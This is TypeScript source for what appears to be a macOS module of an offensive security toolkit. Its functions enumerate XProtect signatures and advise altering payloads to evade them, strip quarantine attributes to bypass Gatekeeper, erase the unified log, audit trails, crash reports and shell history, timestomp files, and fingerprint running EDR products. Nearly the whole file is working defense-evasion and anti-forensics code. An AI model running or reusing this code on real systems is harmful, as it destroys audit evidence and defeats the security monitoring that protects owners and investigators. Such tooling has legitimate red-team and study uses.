import { run, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function xprotectCheck(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating XProtect and MRT signatures...\n"]

  const xprotectPaths = [
    "/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.yara",
    "/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.plist",
    "/Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.meta.plist",
  ]

  for (const p of xprotectPaths) {
    if (await Bun.file(p).exists()) {
      output.push(`[+] Found: ${p}`)
    }
  }

  const yaraSigs = await run("grep", ["-c", "^rule ", xprotectPaths[0]], timeout)
  if (yaraSigs.exitCode === 0) {
    output.push(`\n[+] XProtect YARA rules: ${yaraSigs.stdout.trim()}`)
  }

  const yaraNames = await run("grep", ["^rule ", xprotectPaths[0]], timeout)
  if (yaraNames.exitCode === 0) {
    const rules = yaraNames.stdout.split("\n").filter(Boolean)
    output.push(`\n[+] Detection signatures:`)
    for (const r of rules) output.push(`    ${r.trim()}`)
    findings.push({
      checkId: "MAC-XPROTECT-001",
      provider: "macos",
      severity: "info",
      status: "ENUMERATED",
      resource: "macos://xprotect",
      title: `XProtect YARA rules enumerated: ${rules.length}`,
      details: `${rules.length} YARA detection rules active — review for payload evasion`,
      remediation: "Modify payloads to avoid matching these signatures",
    })
  }

  const xprotectMeta = await run("defaults", ["read", xprotectPaths[2].replace(".plist", "")], timeout)
  if (xprotectMeta.exitCode === 0) {
    output.push(`\n[+] XProtect meta (blocked plugins/extensions):\n${xprotectMeta.stdout.substring(0, 2000)}`)
  }

  const mrtPath = "/Library/Apple/System/Library/CoreServices/MRT.app"
  if (await Bun.file(`${mrtPath}/Contents/Info.plist`).exists()) {
    const mrtVersion = await run(
      "defaults",
      ["read", `${mrtPath}/Contents/Info`, "CFBundleShortVersionString"],
      timeout,
    )
    output.push(`\n[+] MRT version: ${mrtVersion.stdout.trim()}`)
  }

  const gatekeeperStatus = await run("spctl", ["--status"], timeout)
  output.push(`\n[+] Gatekeeper: ${gatekeeperStatus.stdout.trim() || gatekeeperStatus.stderr.trim()}`)

  const sipStatus = await run("csrutil", ["status"], timeout)
  output.push(`[+] SIP: ${sipStatus.stdout.trim()}`)

  const fdeStatus = await run("fdesetup", ["status"], timeout)
  output.push(`[+] FileVault: ${fdeStatus.stdout.trim()}`)

  const firewallStatus = await run("defaults", ["read", "/Library/Preferences/com.apple.alf", "globalstate"], timeout)
  const fwState = firewallStatus.stdout.trim()
  output.push(
    `[+] Firewall: ${fwState === "0" ? "OFF" : fwState === "1" ? "ON (specific services)" : fwState === "2" ? "ON (block all incoming)" : fwState}`,
  )

  const swVers = await run("sw_vers", [], timeout)
  if (swVers.exitCode === 0) {
    output.push(`\n[+] macOS Version:\n${swVers.stdout.trim()}`)
  }
  const uname = await run("uname", ["-a"], timeout)
  if (uname.exitCode === 0) {
    output.push(`[+] Kernel: ${uname.stdout.trim()}`)
  }
  const installedApps = await run("ls", ["/Applications"], timeout)
  if (installedApps.exitCode === 0) {
    const apps = installedApps.stdout.split("\n").filter((a) => a.endsWith(".app"))
    output.push(`\n[+] Installed Applications (${apps.length}):`)
    for (const a of apps) output.push(`    ${a}`)
  }
  const brewList = await run("brew", ["list", "--versions"], timeout)
  if (brewList.exitCode === 0 && brewList.stdout.trim()) {
    const pkgs = brewList.stdout.trim().split("\n")
    output.push(`\n[+] Homebrew packages (${pkgs.length}):`)
    for (const p of pkgs.slice(0, 50)) output.push(`    ${p}`)
  }

  findings.push({
    checkId: "MAC-RECON-001",
    provider: "macos",
    severity: "info",
    status: "ENUMERATED",
    resource: "macos://system",
    title: "macOS system and software enumeration",
    details:
      "macOS version, kernel, installed applications, and Homebrew packages enumerated. Review application names and versions in the output — for any with a version, check CVE database via cve-mcp (cve search_by_product --product <name> --version <ver>). If cve-mcp is not enabled: cyberstrike mcp enable cve",
    remediation: "Remove unnecessary applications. Keep macOS and all software updated.",
  })

  return { output: output.join("\n"), findings }
}

export async function gatekeeperBypass(args: string[], timeout: number): Promise<HookResult> {
  const targetPath = argVal(args, "--path")
  const recursive = hasFlag(args, "--recursive")
  const findings: Finding[] = []
  const output: string[] = ["[*] Gatekeeper bypass — removing quarantine xattr...\n"]

  if (!targetPath) {
    return {
      output: "[!] --path is required. Usage: machook gatekeeper_bypass --path /path/to/file [--recursive]",
      findings,
    }
  }

  const before = await run("xattr", ["-l", targetPath], timeout)
  const hasQuarantine = before.stdout.includes("com.apple.quarantine")
  output.push(`[*] Target: ${targetPath}`)
  output.push(`[*] Quarantine xattr present: ${hasQuarantine ? "YES" : "NO"}`)

  if (before.stdout) {
    output.push(`[*] Current xattrs:\n${before.stdout}`)
  }

  if (!hasQuarantine && !recursive) {
    output.push("\n[*] No quarantine attribute found — file is already trusted by Gatekeeper")
    return { output: output.join("\n"), findings }
  }

  const xattrArgs = recursive
    ? ["-r", "-d", "com.apple.quarantine", targetPath]
    : ["-d", "com.apple.quarantine", targetPath]

  const remove = await run("xattr", xattrArgs, timeout)
  if (remove.exitCode === 0) {
    output.push(`\n[+] Quarantine xattr removed ${recursive ? "recursively " : ""}from ${targetPath}`)
    findings.push({
      checkId: "MAC-GK-001",
      provider: "macos",
      severity: "high",
      status: "BYPASSED",
      resource: targetPath,
      title: `Gatekeeper bypassed: ${targetPath}`,
      details: `Removed com.apple.quarantine xattr${recursive ? " recursively" : ""}`,
      remediation: "Re-quarantine: xattr -w com.apple.quarantine '0081' <path>",
    })
  }

  if (remove.exitCode !== 0) {
    output.push(`\n[!] Failed to remove xattr: ${remove.stderr.trim()}`)
  }

  const codesign = await run("codesign", ["-dv", targetPath], timeout)
  output.push(`\n[*] Code signature:\n${codesign.stderr || codesign.stdout || "unsigned"}`)

  return { output: output.join("\n"), findings }
}

export async function logClear(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Clearing macOS logs and audit trails...\n"]

  const logDirs = [
    { path: "/var/log", desc: "System logs" },
    { path: "/var/audit", desc: "BSM audit logs" },
    { path: "/Library/Logs", desc: "Library logs" },
    { path: `${process.env.HOME}/Library/Logs`, desc: "User library logs" },
    { path: "/Library/Logs/DiagnosticReports", desc: "Crash reports" },
    { path: `${process.env.HOME}/Library/Logs/DiagnosticReports`, desc: "User crash reports" },
  ]

  for (const dir of logDirs) {
    const ls = await run("ls", ["-la", dir.path], timeout)
    if (ls.exitCode !== 0) continue

    const files = ls.stdout.split("\n").filter((l) => l && !l.startsWith("total") && !l.startsWith("d")).length
    output.push(`[+] ${dir.desc} (${dir.path}): ${files} files`)

    if (dir.path === "/var/audit") {
      const rm = await run("rm", ["-f", `${dir.path}/current`, `${dir.path}/*.trail`], timeout)
      if (rm.exitCode === 0) output.push(`    [+] Audit logs cleared`)
    }

    if (dir.path.includes("DiagnosticReports")) {
      const rm = await run("rm", ["-rf", `${dir.path}/*.crash`, `${dir.path}/*.diag`, `${dir.path}/*.ips`], timeout)
      if (rm.exitCode === 0) output.push(`    [+] Crash reports cleared`)
    }
  }

  const aslClear = await run("sudo", ["log", "erase", "--all"], timeout)
  if (aslClear.exitCode === 0) {
    output.push("\n[+] Unified log store erased")
    findings.push({
      checkId: "MAC-LOG-001",
      provider: "macos",
      severity: "high",
      status: "CLEARED",
      resource: "macos://unified-log",
      title: "Unified log store erased",
      details: "All unified logging entries cleared via `log erase --all`",
      remediation: "Logs cannot be recovered after erasure",
    })
  }

  if (aslClear.exitCode !== 0) {
    output.push(`\n[!] Log erase failed (needs root): ${aslClear.stderr.trim()}`)
  }

  const historyFiles = [
    `${process.env.HOME}/.bash_history`,
    `${process.env.HOME}/.zsh_history`,
    `${process.env.HOME}/.python_history`,
  ]
  for (const hist of historyFiles) {
    if (await Bun.file(hist).exists()) {
      await run("cp", ["/dev/null", hist], timeout)
      output.push(`[+] Cleared: ${hist}`)
    }
  }

  const recentItems = `${process.env.HOME}/Library/Application Support/com.apple.sharedfilelist`
  if (await Bun.file(recentItems).exists()) {
    output.push(`[*] Recent items at: ${recentItems} (clear manually if needed)`)
  }

  findings.push({
    checkId: "MAC-LOG-002",
    provider: "macos",
    severity: "high",
    status: "CLEARED",
    resource: "macos://logs",
    title: "macOS log clearing completed",
    details: "Cleared audit logs, crash reports, shell history",
    remediation: "Forensic recovery may still be possible from Time Machine backups",
  })

  return { output: output.join("\n"), findings }
}

export async function historyClear(args: string[], timeout: number): Promise<HookResult> {
  const clearClipboard = hasFlag(args, "--clipboard")
  const findings: Finding[] = []
  const output: string[] = ["[*] Clearing shell and application history...\n"]
  const home = process.env.HOME || "/root"
  let cleared = 0

  const historyFiles = [
    `${home}/.bash_history`,
    `${home}/.zsh_history`,
    `${home}/.python_history`,
    `${home}/.node_repl_history`,
    `${home}/.lesshst`,
    `${home}/.viminfo`,
  ]

  for (const hist of historyFiles) {
    if (await Bun.file(hist).exists()) {
      await run("cp", ["/dev/null", hist], timeout)
      output.push(`[+] Cleared: ${hist}`)
      cleared++
    }
  }

  const recentItemsDir = `${home}/Library/Application Support/com.apple.sharedfilelist`
  const recentLs = await run("ls", [recentItemsDir], timeout)
  if (recentLs.exitCode === 0 && recentLs.stdout.trim()) {
    const files = recentLs.stdout.trim().split("\n").filter(Boolean)
    for (const f of files) {
      await run("rm", ["-f", `${recentItemsDir}/${f}`], timeout)
    }
    output.push(`[+] Cleared ${files.length} recent item files from sharedfilelist`)
    cleared += files.length
  }

  const suggestionsDir = `${home}/Library/Suggestions`
  const sugLs = await run("ls", [suggestionsDir], timeout)
  if (sugLs.exitCode === 0 && sugLs.stdout.trim()) {
    await run("rm", ["-rf", `${suggestionsDir}/*`], timeout)
    output.push(`[+] Cleared Spotlight suggestions`)
    cleared++
  }

  if (clearClipboard) {
    const pb = await run("pbcopy", [], timeout)
    if (pb.exitCode === 0) {
      output.push(`[+] Clipboard cleared`)
      cleared++
    }
  }

  output.push(`\n[*] Total items cleared: ${cleared}`)

  findings.push({
    checkId: "MAC-HIST-001",
    provider: "macos",
    severity: "high",
    status: "CLEARED",
    resource: "macos://history",
    title: `Shell and application history cleared: ${cleared} items`,
    details: `Cleared ${cleared} history files, recent items, and Spotlight suggestions${clearClipboard ? " (clipboard included)" : ""}`,
    remediation: "History files may be recoverable from Time Machine or iCloud backups",
  })

  return { output: output.join("\n"), findings }
}

export async function timestomp(args: string[], timeout: number): Promise<HookResult> {
  const targetPath = argVal(args, "--path")
  const refFile = argVal(args, "--reference")
  const dateStr = argVal(args, "--date")
  const findings: Finding[] = []
  const output: string[] = ["[*] Modifying file timestamps...\n"]

  if (!targetPath) {
    return {
      output:
        '[!] --path is required. Usage: machook timestomp --path /path/to/file [--reference /ref/file] [--date "YYYY-MM-DD HH:MM:SS"]',
      findings,
    }
  }

  const beforeStat = await run("stat", ["-f", "%N  atime=%Sa  mtime=%Sm  ctime=%Sc  birth=%SB", targetPath], timeout)
  if (beforeStat.exitCode !== 0) {
    return {
      output: `[!] File not found or inaccessible: ${targetPath}\n${beforeStat.stderr}`,
      findings,
    }
  }
  output.push(`[*] Before:\n    ${beforeStat.stdout.trim()}`)

  if (refFile) {
    const touchRef = await run("touch", ["-r", refFile, targetPath], timeout)
    if (touchRef.exitCode === 0) {
      output.push(`\n[+] Timestamps copied from reference: ${refFile}`)
    }
    if (touchRef.exitCode !== 0) {
      output.push(`\n[!] Failed to copy timestamps: ${touchRef.stderr.trim()}`)
    }
  }

  if (dateStr) {
    const touchDate = dateStr.replace(/[-: ]/g, "").substring(0, 12)
    const touchResult = await run("touch", ["-t", touchDate, targetPath], timeout)
    if (touchResult.exitCode === 0) {
      output.push(`\n[+] Timestamps set to: ${dateStr}`)
    }
    if (touchResult.exitCode !== 0) {
      output.push(`\n[!] Failed to set timestamps: ${touchResult.stderr.trim()}`)
    }
  }

  if (!refFile && !dateStr) {
    output.push("\n[!] No --reference or --date specified. Provide one to modify timestamps.")
    return { output: output.join("\n"), findings }
  }

  const afterStat = await run("stat", ["-f", "%N  atime=%Sa  mtime=%Sm  ctime=%Sc  birth=%SB", targetPath], timeout)
  output.push(`\n[*] After:\n    ${afterStat.stdout.trim()}`)

  findings.push({
    checkId: "MAC-TIMESTOMP-001",
    provider: "macos",
    severity: "high",
    status: "MODIFIED",
    resource: targetPath,
    title: `File timestamps modified: ${targetPath}`,
    details: `Modified atime/mtime on ${targetPath}${refFile ? ` (reference: ${refFile})` : ""}${dateStr ? ` (date: ${dateStr})` : ""}`,
    remediation: "Birth time (crtime) cannot be modified without raw disk access — forensic recovery possible",
  })

  return { output: output.join("\n"), findings }
}

export async function endpointSecurityBypass(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating Endpoint Security extensions and EDR products...\n"]

  const sysext = await run("systemextensionsctl", ["list"], timeout)
  if (sysext.exitCode === 0) {
    output.push("[+] System Extensions:")
    output.push(sysext.stdout.trim())
  }
  if (sysext.exitCode !== 0) {
    output.push(`[!] systemextensionsctl failed: ${sysext.stderr.trim()}`)
  }

  const edrProducts = [
    { process: "falcond", name: "CrowdStrike Falcon", risk: "CRITICAL" },
    { process: "SentinelAgent", name: "SentinelOne", risk: "CRITICAL" },
    { process: "CbOsxSensorService", name: "VMware Carbon Black", risk: "HIGH" },
    { process: "SophosScanD", name: "Sophos", risk: "HIGH" },
    { process: "JamfProtect", name: "Jamf Protect", risk: "HIGH" },
    { process: "JamfDaemon", name: "Jamf Pro", risk: "MEDIUM" },
    { process: "MsMpEng", name: "Microsoft Defender", risk: "MEDIUM" },
    { process: "com.eset.remoteadministrator", name: "ESET", risk: "MEDIUM" },
    { process: "CylanceSvc", name: "Cylance/BlackBerry", risk: "HIGH" },
    { process: "cortaboruim", name: "Palo Alto Cortex XDR", risk: "CRITICAL" },
  ]

  const detected: Array<{ name: string; risk: string }> = []
  for (const edr of edrProducts) {
    const pgrep = await run("pgrep", ["-x", edr.process], timeout)
    if (pgrep.exitCode === 0) {
      output.push(`[!] EDR detected: ${edr.name} (process: ${edr.process}) [${edr.risk}]`)
      detected.push({ name: edr.name, risk: edr.risk })
    }
  }

  if (detected.length === 0) {
    output.push("\n[+] No known EDR processes detected")
  }

  const sysextDir = await run("ls", ["-la", "/Library/SystemExtensions"], timeout)
  if (sysextDir.exitCode === 0) {
    output.push(`\n[+] /Library/SystemExtensions contents:`)
    output.push(sysextDir.stdout.trim())
  }

  const sipCheck = await run("csrutil", ["status"], timeout)
  const sipDisabled = sipCheck.stdout.includes("disabled")
  output.push(`\n[+] SIP: ${sipCheck.stdout.trim()}`)

  if (sipDisabled) {
    output.push("[!] SIP is DISABLED — kext loading/unloading and system extension removal possible")
  }

  const mdmCheck = await run("profiles", ["status", "-type", "enrollment"], timeout)
  output.push(`\n[+] MDM Enrollment:`)
  if (mdmCheck.exitCode === 0) {
    output.push(mdmCheck.stdout.trim())
  }
  if (mdmCheck.exitCode !== 0) {
    output.push(mdmCheck.stderr.trim() || "Unable to check MDM status")
  }

  const mdmProfiles = await run("profiles", ["-C"], timeout)
  if (mdmProfiles.exitCode === 0 && mdmProfiles.stdout.trim()) {
    const profileCount = (mdmProfiles.stdout.match(/attribute:/gi) || []).length
    output.push(`\n[+] Configuration profiles: ${profileCount} attributes detected`)
    output.push(mdmProfiles.stdout.substring(0, 1000))
  }

  findings.push({
    checkId: "MAC-ES-001",
    provider: "macos",
    severity: "info",
    status: "ENUMERATED",
    resource: "macos://endpoint-security",
    title: `Endpoint security enumeration: ${detected.length} EDR product(s) detected`,
    details: `${detected.length > 0 ? `EDR products: ${detected.map((d) => d.name).join(", ")}` : "No known EDR products detected"}. SIP: ${sipDisabled ? "DISABLED" : "ENABLED"}`,
    remediation: "Ensure EDR agents are tamper-protected and cannot be disabled by local admins",
  })

  if (sipDisabled || detected.length === 0) {
    findings.push({
      checkId: "MAC-ES-002",
      provider: "macos",
      severity: "high",
      status: "VULNERABLE",
      resource: "macos://endpoint-security",
      title: `Endpoint security bypass vector: ${sipDisabled ? "SIP disabled" : "no EDR detected"}`,
      details: `${sipDisabled ? "SIP is disabled — system extensions can be unloaded, kexts can be loaded/removed, and AMFI can be bypassed" : "No EDR products running — endpoint has no active monitoring"}`,
      remediation: sipDisabled
        ? "Enable SIP: boot to Recovery Mode, run csrutil enable"
        : "Deploy an EDR solution with tamper protection",
    })
  }

  return { output: output.join("\n"), findings }
}
